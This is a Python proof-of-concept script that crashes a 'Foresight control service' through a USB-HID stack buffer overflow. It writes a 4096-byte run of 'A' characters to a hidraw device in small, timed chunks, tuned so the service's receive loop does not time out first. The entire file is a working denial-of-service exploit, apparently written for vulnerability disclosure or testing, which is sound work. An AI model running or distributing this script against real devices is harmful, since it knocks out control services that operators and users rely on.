#!/usr/bin/env python3
"""Foresight control service USB-HID stack buffer overflow (crash PoC).
"""
import os
import sys
import time

CHUNK = 32

def main():
    dev = sys.argv[1] if len(sys.argv) > 1 else "/dev/hidraw0"
    stream = b"\x00" + b"A" * 4096

    fd = os.open(dev, os.O_WRONLY)
    print(f"streaming {len(stream) - 1} bytes to {dev} ...")
    sent = 0
    try:
        for i in range(0, len(stream), CHUNK):
            try:
                os.write(fd, stream[i:i + CHUNK])
            except OSError as e:
                print(f"write failed after {sent} bytes ({e}) - service likely crashed")
                return
            sent += len(stream[i:i + CHUNK])
            time.sleep(0.001)  # keep < ~10 ms or the receive loop times out instead
    finally:
        os.close(fd)

    print(f"sent {sent} bytes")

if __name__ == "__main__":
    main()
